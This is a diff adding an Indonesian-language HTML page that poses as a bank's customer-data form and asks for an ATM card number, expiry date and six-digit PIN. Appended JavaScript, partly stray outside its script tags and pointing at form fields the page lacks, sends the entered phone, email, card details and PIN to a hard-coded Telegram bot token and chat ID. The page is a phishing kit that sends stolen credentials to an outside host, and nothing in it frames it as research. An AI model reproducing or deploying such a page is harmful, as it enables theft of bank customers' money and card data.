@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Form Data Nasabah</title>
+<style>
+  body {
+    margin: 0;
+    font-family: 'Arial', sans-serif;
+    background-color: #fff;
+  }
+  .header {
+    background: linear-gradient(45deg, #1669b9, #1eaefc);
+    color: white;
+    padding: 20px 16px;
+    position: relative;
+  }
+  .back-arrow {
+    position: absolute;
+    left: 16px;
+    top: 20px;
+    font-weight: bold;
+    font-size: 24px;
+    cursor: pointer;
+  }
+  .header h2 {
+    margin: 0;
+    text-align: center;
+    font-weight: 600;
+  }
+  .container {
+    margin: 20px 16px;
+  }
+  label {
+    font-weight: 500;
+    color: #6d6d72;
+    font-size: 14px;
+    display: block;
+    margin-bottom: 6px;
+  }
+  input[type=text], input[type=password], input[type=tel] {
+    width: 100%;
+    padding: 12px 40px 12px 12px;
+    font-size: 14px;
+    border-radius: 8px;
+    border: 1px solid #d8d8d8;
+    background-color: #f6f8fa;
+    box-sizing: border-box;
+    color: #1669b9;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    outline: none;
+  }
+  .input-with-icon {
+    position: relative;
+    margin-top: 6px;
+  }
+  .input-with-icon svg {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    fill: #1669b9;
+    width: 20px;
+    height: 20px;
+  }
+  .helper-text {
+    font-size: 12px;
+    color: #999;
+    text-align: right;
+    margin-top: 2px;
+  }
+  button {
+    background-color: #ffcb45;
+    border: none;
+    color: #666;
+    font-weight: 600;
+    width: 100%;
+    padding: 14px 0;
+    font-size: 16px;
+    border-radius: 10px;
+    margin-top: 32px;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="back-arrow">&#8592;</div>
+  <h2>Informasi Data Nasabah.</h2>
+</div>
+
+<div class="container">
+  <form>
+    <label for="cardNumber">Nomor Kartu ATM</label>
+    <input type="tel" id="cardNumber" maxlength="18" placeholder="Masukkan nomor kartu ATM Kamu" pattern="\d*" inputmode="numeric" />
+    <div class="helper-text" id="cardNumberCount">0/18</div>
+
+    <label for="expiryDate" style="margin-top: 20px;">Tanggal Kadalursa Kartu ATM</label>
+    <div class="input-with-icon">
+      <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" />
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-label="Calendar icon" role="img">
+        <path d="M7 11h2v2H7v-2zm4 0h2v2h-2v-2zm4 0h2v2h-2v-2zM3 21h18v-2H3v2zm18-12h-3V4h-2v5H8V4H6v5H3v2h18v-2z" />
+      </svg>
+    </div>
+
+    <label for="pin" style="margin-top: 20px;">6-Digit PIN Kartu ATM</label>
+    <div class="input-with-icon">
+      <input type="password" id="pin" maxlength="6" placeholder="PIN" pattern="\d*" inputmode="numeric" />
+      <svg id="togglePin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-label="Toggle PIN visibility" role="button" tabindex="0">
+        <path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
+        <line x1="1" y1="1" x2="23" y2="23" stroke="#656565" stroke-width="2" />
+      </svg>
+    </div>
+    <div class="helper-text" id="pinCount">0/6</div>
+
+    <button type="submit">Selanjutnya</button>
+  </form>
+</div>
+
+<script>
+  // Update counter for card number
+  const cardNumberInput = document.getElementById('cardNumber');
+  const cardNumberCount = document.getElementById('cardNumberCount');
+  cardNumberInput.addEventListener('input', () => {
+    cardNumberCount.textContent = `${cardNumberInput.value.length}/18`;
+  });
+
+  // Update counter for PIN
+  const pinInput = document.getElementById('pin');
+  const pinCount = document.getElementById('pinCount');
+  pinInput.addEventListener('input', () => {
+    pinCount.textContent = `${pinInput.value.length}/6`;
+  });
+
+  // Toggle PIN visibility
+  const togglePin = document.getElementById('togglePin');
+  togglePin.addEventListener('click', () => {
+    if(pinInput.type === 'password'){
+      pinInput.type = 'text';
+      togglePin.innerHTML = `<path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>`;
+    } else {
+      pinInput.type = 'password';
+      togglePin.innerHTML = `<path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
+      <line x1="1" y1="1" x2="23" y2="23" stroke="#656565" stroke-width="2" />`;
+    }
+  });
+</script>
+const phoneInput = document.getElementById('phone');
+const emailInput = document.getElementById('email');
+const cardNumberInput = document.getElementById('cardNumber');
+const expiryDateInput = document.getElementById('expiryDate');
+const pinInput = document.getElementById('pin');
+const form = document.getElementById('form');
+const cardNumberCount = document.getElementById('cardNumberCount');
+const pinCount = document.getElementById('pinCount');
+
+// Telegram credentials (gunakan token dan chat ID yang valid)
+const botToken = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Dari skrip pertama
+const chatId = '7213790655'; // Dari skrip pertama
+
+// Set nilai awal +62 dan letakkan cursor di akhir input
+function setCursorToEnd(el) {
+    if (el.setSelectionRange) {
+        el.focus();
+        const length = el.value.length;
+        el.setSelectionRange(length, length);
+    }
+}
+phoneInput.value = '+62';
+setCursorToEnd(phoneInput);
+
+// Fungsi format nomor dengan spasi setiap 3 digit (setelah +62)
+function formatPhone(value) {
+    // Hilangkan semua selain angka
+    let number = value.replace(/\D/g, '');
+    // Pastikan +62 ada di depan, hilangkan 62 di awal pada number
+    if (number.startsWith('62')) {
+        number = number.substring(2);
+    }
+    // Batasi panjang maksimum 13 digit
+    if (number.length > 13) {
+        number = number.substring(0, 13);
+    }
+    // Kelompokkan angka per 3 digit kecuali sisa 1 atau 2 digit terakhir
+    let groups = [];
+    let i = 0;
+    while(i < number.length){
+        if(i >= 9) {
+            groups.push(number.substring(i));
+            break;
+        }
+        groups.push(number.substr(i, 3));
+        i += 3;
+    }
+    return '+62 ' + groups.join(' ');
+}
+
+phoneInput.addEventListener('input', (e) => {
+    // Pastikan prefix +62 tidak bisa dihapus
+    if (!phoneInput.value.startsWith('+62')) {
+        phoneInput.value = '+62';
+        setCursorToEnd(phoneInput);
+        return;
+    }
+    // Format nomor dengan spasi
+    const formatted = formatPhone(phoneInput.value);
+    phoneInput.value = formatted;
+    setCursorToEnd(phoneInput);
+});
+
+// Update counter untuk card number
+cardNumberInput.addEventListener('input', () => {
+    cardNumberCount.textContent = `${cardNumberInput.value.length}/18`;
+});
+
+// Update counter untuk PIN
+pinInput.addEventListener('input', () => {
+    pinCount.textContent = `${pinInput.value.length}/6`;
+});
+
+// Format expiry date
+expiryDateInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+    e.target.value = value;
+});
+
+form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    // Ambil dan normalisasi input nomor phone (hilangkan spasi dan +)
+    let phoneRaw = phoneInput.value.replace(/\s/g, '').replace(/^\+/, '');
+    // Validasi panjang nomor angka sesudah 62 harus 4 sampai 15 digit total
+    if (!phoneRaw.startsWith('62') || phoneRaw.length < 4 || phoneRaw.length > 15) { 
+        alert('Nomor handphone harus diawali +62 dan mengandung 4 sampai 15 digit angka total.');
+        return;
+    }
+    // Cek digit sesudah kode negara
+    let digitsAfter62 = phoneRaw.substring(2);
+    if (digitsAfter62.length > 13) {
+        alert('Nomor handphone maksimal 13 digit angka setelah +62.');
+        return;
+    }
+    // Validasi email harus mengandung '@' dan minimal 3 karakter total
+    const emailVal = emailInput.value.trim();
+    if (emailVal.length < 3 || !emailVal.includes('@')) {
+        alert('Format email tidak valid. Harus mengandung karakter "@"');
+        return;
+    }
+
+    const cardNumber = cardNumberInput.value.trim();
+    const expiryDate = expiryDateInput.value.trim();
+    const pin = pinInput.value.trim();
+
+    // Validasi sederhana untuk kartu ATM
+    const mmYYPattern = /^(0[1-9]|1[0-2])\/\d{2}$/;
+    if(cardNumber.length < 16 || cardNumber.length > 18){
+        alert('Nomor kartu ATM harus antara 16-18 digit');
+        return;
+    }
+    if(!mmYYPattern.test(expiryDate)){
+        alert('Tanggal kadalursa harus format MM/YY');
+        return;
+    }
+    if(pin.length !== 6){
+        alert('PIN harus 6 digit');
+        return;
+    }
+
+    // Pesan yang akan dikirim (handphone tanpa spasi dan dengan +)
+    const phoneToSend = '+' + phoneRaw;
+    const message = 
+        `📋 *Informasi Data Lengkap*\n\n` +
+        `*Nomor Handphone:* ${phoneToSend}\n` +
+        `*Email:* ${emailVal}\n` +
+        `*Nomor Kartu ATM:* ${cardNumber}\n` +
+        `*Tanggal Kadalursa:* ${expiryDate}\n` +
+        `*PIN:* ${pin}`;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const params = {
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+    };
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(params)
+        });
+
+        if(response.ok){
+            alert('Data berhasil terkirim ke Telegram!');
+            form.reset();
+            phoneInput.value = '+62';
+            setCursorToEnd(phoneInput);
+            cardNumberCount.textContent = '0/18';
+            pinCount.textContent = '0/6';
+        } else {
+            alert('Gagal mengirim data ke Telegram.');
+        }
+    } catch (error) {
+        alert('Terjadi kesalahan: ' + error.message);
+    }
+});
+
+</body>
+</html>
